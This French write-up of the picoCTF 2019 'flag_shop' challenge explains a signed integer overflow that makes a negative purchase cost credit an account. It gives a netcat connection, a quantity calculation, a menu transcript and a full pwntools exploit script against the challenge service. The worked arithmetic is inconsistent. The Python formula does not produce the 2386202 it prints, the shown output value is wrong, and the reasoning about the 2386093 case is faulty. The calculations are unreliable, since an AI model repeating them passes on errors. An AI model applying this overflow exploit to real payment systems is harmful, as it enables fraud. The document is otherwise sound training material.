# 49 — flag_shop

**Événement** : picoCTF 2019 · **Catégorie** : General Skills · **Auteur** : Danny

## Énoncé

Un service de vente de flags propose deux articles : des contrefaçons à 900 unités et le « 1337
Flag » à 100 000 unités, alors que le compte de départ contient 1 100 unités. Le code source C est
fourni et l'indice évoque le complément à deux (« Two's complement can do some weird things when
numbers get really big! »).

## Analyse

Le code source tient en une page. Les variables en jeu sont des `int` signés sur 32 bits :

```c
int account_balance = 1100;
...
int total_cost = 0;
total_cost = 900*number_flags;
if(total_cost <= account_balance){
    account_balance = account_balance - total_cost;
}
```

Deux observations suffisent.

D'une part, le contrôle `total_cost <= account_balance` porte sur un **entier signé**. Si
`900*number_flags` dépasse `2^31 - 1` (2147483647), la multiplication déborde : le résultat est lu
en complément à deux et devient négatif.

D'autre part, un `total_cost` négatif satisfait la condition, et `account_balance - total_cost`
**augmente** alors le solde au lieu de le diminuer. Un achat « gratuit » qui crédite le compte.

Il ne reste qu'à acheter le flag à 100 000 unités : le contrôle d'accès est
`if(account_balance > 100000)`, sans autre vérification que le solde.

## Solution

1. Se connecter et repérer les menus :

```bash
nc <HOST> 4906
```

Le menu propose `1. Buy flags`, `2. Exit`, puis pour l'achat `1. Defintely not the flag Flag` à 900
et `2. 1337 Flag` à 100 000.

2. Calculer la quantité qui fait passer `900 * n` au-delà de `2^31 - 1`, en gardant assez de marge
   pour atteindre 100 000 ensuite :

```python
amount = (2**31 - 1 - 1100 + 100000) // 900
print(amount, 900 * amount, 900 * amount - 2**32)
# 2386202  -2147482456
```

3. Acheter `2386202` contrefaçons : le coût affiché est négatif et le solde devient supérieur à
   100 000.

```
Enter a menu selection
2
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2386202
```

4. Acheter le « 1337 Flag » (option `2` puis `1` pour un exemplaire) : le service renvoie le contenu
   de `flag.txt`.

Script pwntools équivalent :

```python
from pwn import *

io = remote("<HOST>", 4906)
io.sendlineafter(b" Enter a menu selection\n", b"2")
io.sendlineafter(b"2. 1337 Flag\n", b"1")
io.sendlineafter(b"enter desired quantity\n", str(2386202).encode())
io.sendlineafter(b" Enter a menu selection\n", b"2")
io.sendlineafter(b"2. 1337 Flag\n", b"2")
io.sendlineafter(b"Enter 1 to buy one", b"1")
print(io.recvlineS())
```

## Pièges

- **Le prix des contrefaçons varie.** D'un déploiement à l'autre, le prix est 900 ou 1000 : la
  quantité à fournir change. On lit le montant sur l'interface avant de calculer.
- **Dépassement insuffisant.** `n = 2386093` donne un coût négatif mais un solde final trop faible :
  la marge de 100 000 dans le calcul n'est pas décorative.
- **Dépassement trop grand.** Une quantité énorme peut faire repasser le coût en positif après un
  ou plusieurs tours de modulo : on vise la première valeur négative, pas la plus grande possible.
- **Solde exact.** Le contrôle est `> 100000`, pas `>=`. Il faut donc dépasser strictement le prix du
  « 1337 Flag ».
- **Saisie non numérique.** Le service lit avec `scanf("%d")` : une chaîne vide ou un caractère
  laisse la valeur précédente et fausse la transaction.

**Pourquoi ça marche.** Le programme fait confiance à une arithmétique qui déborde silencieusement.
Le signe d'un entier 32 bits n'est qu'une convention de lecture du bit de poids fort ; une
multiplication qui dépasse la capacité produit un motif binaire valide mais interprété comme un
nombre négatif. Le contrôle de solde, écrit du point de vue « le coût est positif », se retourne
alors en crédit. La correction tiendrait en un contrôle de plage avant la multiplication, ou en un
type non signé avec vérification de borne.

## Flag

Flag validé sur la plateforme (valeur non conservée).
